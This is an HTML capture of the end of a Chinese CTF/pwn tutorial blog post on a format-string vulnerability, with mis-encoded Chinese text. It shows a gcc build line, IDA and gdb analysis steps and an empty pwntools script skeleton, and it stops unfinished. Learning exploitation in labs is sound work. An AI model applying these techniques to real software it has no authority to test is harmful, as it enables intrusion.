<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc demox.c -o <span class="nb">test</span> -m64 -no-pie 
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>æ³¨æ„ï¼š</p>
<p>è¿›å…¥IDAåˆ†æåï¼Œè·Ÿè¿›vulnå‡½æ•°ï¼š</p>
<p><img src="/p/pwn-3/26.png"
	width="614"
	height="284"
	srcset="/p/pwn-3/26_hu_8cfc9a6904c93706.png 480w, /p/pwn-3/26_hu_8f8ebbaf985be4dc.png 1024w"
	loading="lazy"
	
		alt="vulnå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="216"
		data-flex-basis="518px"
	
></p>
<p>æŒ‰Yé”®ä¿®æ”¹æˆvoidç±»å‹ï¼Œæ¢å¤æˆåŸæ ·ï¼š</p>
<p><img src="/p/pwn-3/27.png"
	width="465"
	height="160"
	srcset="/p/pwn-3/27_hu_89e7b6b049f02a15.png 480w, /p/pwn-3/27_hu_ea32f4941b36b388.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="290"
		data-flex-basis="697px"
	
></p>
</blockquote>
<p>åœ¨IDAåˆ†æä¸­ï¼Œå¯ä»¥å‘ç°chræ˜¯å…¨å±€å˜é‡ä¸åœ¨æ ˆä¸Šï¼Œåœ¨.bsså­—æ®µä¸Šï¼š</p>
<p><img src="/p/pwn-3/28.png"
	width="926"
	height="143"
	srcset="/p/pwn-3/28_hu_2aafe6b3b0cfc6c0.png 480w, /p/pwn-3/28_hu_7552f0dbf35ccd37.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="647"
		data-flex-basis="1554px"
	
></p>
<p>èµ·è‰expï¼Œå¼€å§‹gdbè°ƒè¯•æŸ¥çœ‹æ ˆåˆ†å¸ƒï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./test_plus&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ–­ç‚¹é€‰æ‹©printfçš„åœ°å€ï¼Œç¬¬ä¸€æ¬¡éšä¾¿è¾“å…¥ä¸€ç‚¹ä¸œè¥¿ï¼š</p>
<p><img src="/p/pwn-3/29.png"
	width="1918"
	height="878"
	srcset="/p/pwn-3/29_hu_bbde4f4d11c96923.png 480w, /p/pwn-3/29_hu_90a07bf3b0cc2575.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="524px"
	
></p>
<p>å°±æŒ‘è¿™ä¸€æ¡æ ˆä¸ºä¾‹å­å§ï¼š</p>
<p><img src="/p/pwn-3/30.png"
	width="1918"
	height="878"
	srcset="/p/pwn-3/30_hu_2f7ea610333e0981.png 480w, /p/pwn-3/30_hu_debe8368fe143495.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="524px"
	
></p>
<p>fmtargæŸ¥çœ‹åç§»ï¼š</p>
<p><img src="/p/pwn-3/31.png"
	width="780"
	height="99"
	srcset="/p/pwn-3/31_hu_cc3b373211ba1b29.png 480w, /p/pwn-3/31_hu_675dcb96fff9d23b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="787"
		data-flex-basis="1890px"
	
></p>
<p>æœ¬æ¡ˆä¾‹ä¸å¤Ÿæ˜æ˜¾ï¼Œæœªå®Œå¾…ç»­ï¼Œä½œè€…æ­£åœ¨åŠªåŠ›åˆ·é¢˜å¯»æ‰¾æ¡ˆä¾‹&hellip;</p>

</section>


    <footer class="article-footer">
    

    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            æœ€åæ›´æ–°äº 2025-11-11
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
	const mainArticleElement = document.querySelector(".main-article");
        renderMathInElement(mainArticleElement, {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>

    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/pwn-4/">
        
        
            <div class="article-image">
                <img src="/p/pwn-4/PWN4.4afa5f5bde601dbc35b64aebcb8c25e3_hu_a61ad70f238c03c4.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-4"
                        
                        data-hash="md5-SvpfW95gHbw1tkrry4wl4w==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-4</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E7%BB%99pwn%E6%96%B0%E6%89%8B%E7%9A%84%E6%BA%A2%E5%87%BA%E9%AD%94%E6%B3%95%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/">
        
        
            <div class="article-image">
                <img src="/p/%E7%BB%99pwn%E6%96%B0%E6%89%8B%E7%9A%84%E6%BA%A2%E5%87%BA%E9%AD%94%E6%B3%95%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/PWN%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.4c7e57113df2cad9ff15c86e749215fe_hu_f04fdb455264b7b2.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post ç»™PWNæ–°æ‰‹çš„æº¢å‡ºé­”æ³•å…¥é—¨æ‰‹å†Œ"
                        
                        data-hash="md5-TH5XET3yytn/FchudJIV/g==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ç»™PWNæ–°æ‰‹çš„æº¢å‡ºé­”æ³•å…¥é—¨æ‰‹å†Œ</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-2/">
        
        
            <div class="article-image">
                <img src="/p/pwn-2/PWN2.ec0b8de7542727a390b799ae24c64af8_hu_ed10e985448522e2.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-2"
                        
                        data-hash="md5-7AuN51QnJ6OQt5muJMZK&#43;A==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-2</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-1/">
        
        
            <div class="article-image">
                <img src="/p/pwn-1/PWN.f98719505e350e475520e79f81d73a1d_hu_fb4f51a67c6d3b57.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-1"
                        
                        data-hash="md5-&#43;YcZUF41DkdVIOefgdc6HQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-1</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/ida%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/">
        
        
            <div class="article-image">
                <img src="/p/ida%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/IDA.24e86f15c02689113058084231ff68da_hu_6a8de3be4381c8e4.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post IDAä½¿ç”¨æŒ‡å—"
                        
                        data-hash="md5-JOhvFcAmiREwWAhCMf9o2g==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">IDAä½¿ç”¨æŒ‡å—</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script
    src="https://giscus.app/client.js"
    data-repo="Expl0rer-Ct/Expl0rer.Ct-s-Blog"
    data-repo-id="R_kgDOPd0X7g"
    data-category="Announcements"
    data-category-id="DIC_kwDOPd0X7s4CuMr6"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="top"
    data-theme="light"
    data-lang="en"
    data-loading=""
    crossorigin="anonymous"
    async
></script>
<script>
    function setGiscusTheme(theme) {
        let giscus = document.querySelector("iframe.giscus-frame");
        if (giscus) {
            giscus.contentWindow.postMessage(
                {
                    giscus: {
                        setConfig: {
                            theme: theme,
                        },
                    },
                },
                "https://giscus.app"
            );
        }
    }

    (function () {
        addEventListener("message", (e) => {
            if (event.origin !== "https://giscus.app") return;
            handler();
        });
        window.addEventListener("onColorSchemeChange", handler);

        function handler() {
            if (document.documentElement.dataset.scheme === "light") {
                setGiscusTheme('light');
            } else {
                setGiscusTheme('dark');
            }
        }
    })();
</script>

    

    
<script defer src="https://events.vercount.one/js"></script>
<footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 Expl0rer.Ct
    </section>
    
    <section class="powerby">
        



        















































        
<section class="wordcount">
  <div class="wordcount-row">
    <p>åšä¸»å‘å¸ƒäº†18ç¯‡æ–‡ç«   ||</p>
    <p>æ€»å…±255.51k å­—</p>
  </div>
</section>
        
  


<a>æ€»è®¿å®¢æ•°: </a><span id='busuanzi_value_site_uv'>åˆ«æ€¥åœ¨åŠ è½½ä¸­äº†...</span> <a> | </a> <a>æ€»è®¿é—®é‡: </a><span id='busuanzi_value_site_pv'>åŠ è½½ä¸­...</span></br>



<div class="site-uptime-container">
  <span id="timeDate" class="site-uptime-text">è½½å…¥å¤©æ•°...</span>
  <span id="times" class="site-uptime-text">è½½å…¥æ—¶åˆ†ç§’...</span>
</div>

<script language="javascript"> 
    var now = new Date();
    function createtime(){
        now.setTime(now.getTime()+250); 
        var grt= new Date("2025/08/01 00:00:00"); 
        days = (now - grt ) / 1000 / 60 / 60 / 24;
        dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
        hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;}
        minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes);
        if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds);
        if(String(snum).length ==1 ){snum = "0" + snum;}

        document.getElementById("timeDate").innerHTML = "æœ¬ç«™å·²ç¨³å®šè¿è¡Œ"+dnum+" å¤© ";document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’"
    }
    setInterval("createtime()",250); 
</script> 

<script>
    (function(u, c) {
      var d = document, t = 'script', o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function(e) { c(e); }); }
      s.parentNode.insertBefore(o, s);
    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
      pangu.spacingPage();
    });
</script>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdnjs.cloudflare.com/ajax/libs/node-vibrant/3.1.6/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script><script type="text/javascript" src="/ts/custom.89d9bb2c3c071ae8a261f67661c22b84ef67ba7b7a885dabd2bbd9ebef84ed40.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>


<head>
  
  <link rel="preconnect" href="https://fonts.font.im" crossorigin>
  <link 
    href="https://fonts.font.im/css?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-cn"
  >
  
  
  <link 
    href="https://fonts.googleapis.com/css2?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-en"
    disabled
  >
  
  <script>
    
    document.querySelector('#font-cn').addEventListener('load', function() {
      document.querySelector('#font-en').disabled = true;
    }).addEventListener('error', function() {
      document.querySelector('#font-en').disabled = false;
      document.querySelector('#font-en').media = 'all';
    });
  </script>
  
  <noscript>
    <link 
      href="https://fonts.font.im/css?family=PT+Sans" 
      rel="stylesheet"
    >
  </noscript>
</head>

<style>
    #TableOfContents > ul ul,
    #TableOfContents > ul ol,
    #TableOfContents > ol ul,
    #TableOfContents > ol ol {
        display: none;
    }
    #TableOfContents > ul .open,
    #TableOfContents > ol .open {
        display: block;
    }
</style>

<script>
    function initTocHide() {
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        window.addEventListener('scroll', function() {
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                const parent = ul.parentElement;
                ul = parent ? parent.parentElement : null;
            } while (ul && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>


<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://expl0rer.top/icons/backTop.svg);
    }
</style>

<script>
    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        window.addEventListener('scroll', function() {
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        });
    }

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<style>
    .highlight {
        max-height: 400px;
        overflow: hidden;
    }

    .code-show {
        max-height: none !important;
    }

    .code-more-box {
        width: 100%;
        padding-top: 78px;
        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
        position: absolute;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 1;
    }

    .code-more-btn {
        display: block;
        margin: auto;
        width: 44px;
        height: 22px;
        background: #f0f0f5;
        border-top-left-radius: 8px;
        border-top-right-radius: 8px;
        padding-top: 6px;
        cursor: pointer;
    }

    .code-more-img {
        cursor: pointer !important;
        display: block;
        margin: auto;
        width: 22px;
        height: 16px;
    }
</style>

<script>
  function initCodeMoreBox() {
    let codeBlocks = document.querySelectorAll(".highlight");
    if (!codeBlocks) {
      return;
    }
    codeBlocks.forEach(codeBlock => {
      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
        return;
      }
      let codeMoreBox = document.createElement('div');
      codeMoreBox.classList.add('code-more-box');
      let codeMoreBtn = document.createElement('span');
      codeMoreBtn.classList.add('code-more-btn');
      codeMoreBtn.addEventListener('click', () => {
        codeBlock.classList.add('code-show');
        codeMoreBox.style.display = 'none';
        window.dispatchEvent(new Event('resize'))
      })
      let img = document.createElement('img');
      img.classList.add('code-more-img');
      img.src = "https:\/\/expl0rer.top\/icons\/codeMore.png"
      codeMoreBtn.appendChild(img);
      codeMoreBox.appendChild(codeMoreBtn);
      codeBlock.appendChild(codeMoreBox)
    })
  }
  
  initCodeMoreBox();
</script>






<script>
    function showHideView() {
        let viewCounts = document.querySelectorAll("#viewCount");
        if (viewCounts) {
            let article =  document.querySelector(".article-page");
            if (!article) {
                viewCounts.forEach(ele => {
                    ele.style.display = 'none';
                });
            }
        }
    }
    
    showHideView();
</script>

<script src="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.js" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.css" crossorigin="anonymous" />
<script>
    NProgress.start();
    document.addEventListener("readystatechange", () => {
        if (document.readyState === "interactive") NProgress.inc(0.8);
        if (document.readyState === "complete") NProgress.done();
    });
</script>


<script>
    var pjax = new pjax({
        selectors: [
            ".main-container"
        ]
    })

</script>

<script>
    pjax._handleResponse = pjax.handleResponse;
    pjax.handleResponse = function(responseText, request, href, options) {
        if (request.responseText.match("<html")) {
            if (responseText) {
                let newDom = new DOMParser().parseFromString(responseText, 'text/html');
                let bodyClass = newDom.body.className;
                document.body.setAttribute("class", bodyClass)
            }
            pjax._handleResponse(responseText, request, href, options);
        } else {
        }
    }
</script>



<script>
    document.addEventListener('pjax:complete', () => {
        if (window.Stack && typeof window.Stack.init === 'function') {
            window.Stack.init();
        }
    })
</script>

<div id="particles-js"></div>

<script src="https://expl0rer.top/background/particles.min.js"></script>
<script>
  particlesJS.load('particles-js', "https:\/\/expl0rer.top\/background\/particlesjs-config.json", function() {
    console.log('particles.js loaded - callback');
  });
</script>

<style>
  #particles-js {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    z-index: -1;
  }
</style>


<script src="https://expl0rer.top/background/sakura.js"></script>

    </body>
</html>
